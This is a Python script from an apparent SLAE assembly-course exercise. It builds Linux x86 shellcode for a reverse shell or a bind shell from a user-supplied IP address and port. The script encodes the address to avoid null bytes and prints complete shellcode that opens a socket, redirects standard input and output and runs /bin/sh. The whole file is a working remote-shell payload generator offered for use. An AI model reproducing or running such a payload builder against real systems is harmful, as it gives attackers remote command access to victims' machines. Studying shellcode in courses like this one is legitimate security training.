# Author: RawrRadioMouse
# Purpose: SLAE


#!/usr/bin/python

import sys
import binascii
import socket

if len(sys.argv) < 4:
	print ("Usage: wrapper.py <ip(for BIND do 1.1.1.1> <port> <payload (1=rev 2=bind)>") #let user know that script requires an arg
	exit()

ip = (sys.argv[1])
if len(ip.split(".")) < 4:
	print ("[!] {} not a valid IP, c'mon!").format(port) #tell em off
	sys.exit()

port = int(sys.argv[2])
if (port < 1024 or port > 65535):
	print ("[!] {} not a valid port, must be between 0-65535!").format(port) #tell people off for being silly
	sys.exit()

payload = int(sys.argv[3])
if payload > 2:
	print ("[!] Please select either [1] (reverse) or [2] (bind)!!!")
	sys.exit()

ip = (sys.argv[1])
port = hex(port)[2:] # convert port val to hex, and slice out the preceeding "0x" before the hex output
port = '\\x'+str(port[0:2]) + '\\x'+str(port[2:4]) # further break up hex output and place our "\\x" in front of each hex val	
ip = ip.split('.') #split ip up so we can increment the octets
oct1 = int(ip[0]) + 1 #increase octets as we did manually in nasm
oct2 = int(ip[1]) + 1
oct3 = int(ip[2]) + 1
oct4 = int(ip[3]) + 1
ip = str(oct1) + '.' + str(oct2) + '.' + str(oct3) + '.' + str(oct4) # join em all together
print("Incremented raw IP was " + ip)
ip = socket.inet_aton(ip).hex()
ip = '\\x'+str(ip[0:2]) + '\\x'+str(ip[2:4]) + '\\x'+str(ip[4:6]) + '\\x'+str(ip[6:8])
if ("00") in ip:
	print ("ip contains nulls, try again!")
	sys.exit()
if ("00") in port:
	print ("port contains nulls, try again!")
	sys.exit()
print("IP is: "+ ip)
print("Port is: "+ port)
if payload == int("1"):
	print("Building REVERSE Shellcode")
	shellcode = ""
	shellcode += "\\x31\\xc0\\x50\\x6a\\x01\\x6a\\x02\\x31\\xc9\\x89\\xe1\\xb0"
	shellcode += "\\x66\\x31\\xdb\\xb3\\x01\\xcd\\x80\\x89\\xc6\\x89\\xc3\\x31"
	shellcode += "\\xc9\\x31\\xc0\\xb0\\x3f\\xcd\\x80\\x41\\x80\\xf9\\x04\\x75"
	shellcode += "\\xf4\\x31\\xc9\\xb9"
	shellcode += ip
	shellcode += "\\x81\\xe9\\x01\\x01\\x01\\x01\\x51\\x66\\x68"
	shellcode += port
	shellcode += "\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\x31"
	shellcode += "\\xdb\\xb3\\x03\\x31\\xc0\\xb0\\x66\\xcd\\x80\\x31\\xc0\\x50"
	shellcode += "\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3"
	shellcode += "\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
	print(shellcode)
if payload == int("2"):
	print("Building BIND Shellcode")
	shellcode = ""
	shellcode += "\\x31\\xc0\\x50\\x6a\\x01\\x6a\\x02\\x31\\xc9\\x89\\xe1\\xb0"
	shellcode += "\\x66\\x31\\xdb\\xb3\\x01\\xcd\\x80\\x89\\xc6\\x31\\xdb\\x53"
	shellcode += "\\x66\\x68"
	shellcode += port
	shellcode += "\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\xb3"
	shellcode += "\\x02\\xb0\\x66\\xcd\\x80\\x6a\\x01\\x56\\x89\\xe1\\xb3\\x04"
	shellcode += "\\xb0\\x66\\xcd\\x80\\x50\\x50\\x56\\x89\\xe1\\xb3\\x05\\xb0"
	shellcode += "\\x66\\xcd\\x80\\x89\\xc3\\x31\\xc9\\xb0\\x3f\\xcd\\x80\\x41"
	shellcode += "\\x80\\xf9\\x04\\x75\\xf6\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73"
	shellcode += "\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe2\\x53"
	shellcode += "\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
	print(shellcode)

